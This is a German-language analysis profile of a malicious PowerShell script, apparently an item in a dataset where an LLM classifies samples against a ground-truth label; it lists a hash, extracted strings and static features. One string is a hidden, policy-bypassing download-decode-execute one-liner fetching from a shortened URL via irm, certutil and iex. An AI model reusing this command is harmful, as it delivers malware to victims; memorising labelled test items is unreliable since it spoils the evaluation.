# Steckbrief: tech_011_Base64-irm.ps1

- SHA256: `b181227d7a565a69b64ea211c7f9e94805c71c806991598383de48e7add94205`
- Groesse: 444 Bytes, 13 Zeilen
- Ground-Truth-Label (aus Ordner): **techniques**
- Kein Urteil enthalten. Bewertung erfolgt durch das LLM.

## Stufe 1 - Reine Extraktion
- Strings gesamt: 4 (Auszug unten)
- Base64-Bloecke gesamt: 0, davon dekodierbar: 0
- Strings (Auszug):
  - `Enter the URL (use https://t.ly/)`
  - `
powershell -NoP -W H -Ep Bypass irm $url -O $env:USERPROFILE\e.txt;certutil -f -decode $env:USERPROFILE\e.txt $env:USE`
  - `$env:USERPROFILE\Desktop\Base64-irm.txt`
  - `Script saved as $scriptPath`

## Stufe 2 - Statische Merkmale (zusaetzlich)
- Auffaellige Tokens (Name: Vorkommen):
  - noprofile: 1
- URLs: `https://t.ly/`
- Pfade: `$env:USERPROFILE\Desktop\Base64-irm.txt`, `$env:USERPROFILE\d.ps1`, `$env:USERPROFILE\d.ps1;iex`, `$env:USERPROFILE\e.txt`, `$env:USERPROFILE\e.txt;certutil`
- Cmdlets: Read-Host, Set-Content, Write-Host

## Stufe 3 - Struktur (zusaetzlich)
